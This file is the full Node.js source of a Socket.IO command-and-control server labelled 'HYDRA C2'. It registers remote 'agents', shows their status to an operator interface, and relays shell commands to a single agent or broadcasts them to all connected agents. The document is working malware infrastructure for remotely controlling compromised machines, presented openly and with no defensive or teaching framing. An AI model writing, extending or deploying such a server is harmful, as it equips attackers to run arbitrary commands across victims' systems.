
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.send('HYDRA C2 v110.0 [OMNI BROADCAST]'); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingInterval: 10000,
    pingTimeout: 5000
});

let agents = []; 

io.on('connection', (socket) => {
    // console.log(`[+] New Connection: ${socket.id}`);

    socket.on('identify', (data) => {
        // UI does NOT get added to agents list
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            return;
        }

        console.log(`[+] Agent Identified: ${data.id}`);
        
        const existingIndex = agents.findIndex(a => a.id === data.id);
        if (existingIndex > -1) {
            agents[existingIndex].socketId = socket.id;
            agents[existingIndex].status = 'Online';
            agents[existingIndex].lastSeen = Date.now();
        } else {
            agents.push({ 
                ...data, 
                socketId: socket.id, 
                status: 'Online', 
                lastSeen: Date.now() 
            });
        }
        
        io.to('ui_room').emit('agents_list', agents);
        io.to('ui_room').emit('agent_event', {
            type: 'SYSTEM',
            agentId: 'CORE',
            payload: `NEW NODE LINKED: ${data.id}`
        });
    });

    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        console.log(`[CMD] ${cmd} -> ${targetId}`);
        
        // Notify UI that command was sent
        io.to('ui_room').emit('agent_event', { type: 'INFO', agentId: 'C2', payload: `TX: ${cmd}` });

        if (targetId === 'all') {
            // FIX: io.emit sends to everyone connected to default namespace. 
            // This guarantees the Python agent receives it if connected.
            io.emit('exec_cmd', { cmd });
        } else {
            const target = agents.find(a => a.id === targetId);
            if (target) {
                io.to(target.socketId).emit('exec_cmd', { cmd });
            }
        }
    });
    
    socket.on('agent_event', (data) => {
        io.to('ui_room').emit('agent_event', data);
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            agent.status = 'Offline'; 
            io.to('ui_room').emit('agents_list', agents);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v110 LISTENING ON ${PORT}`));

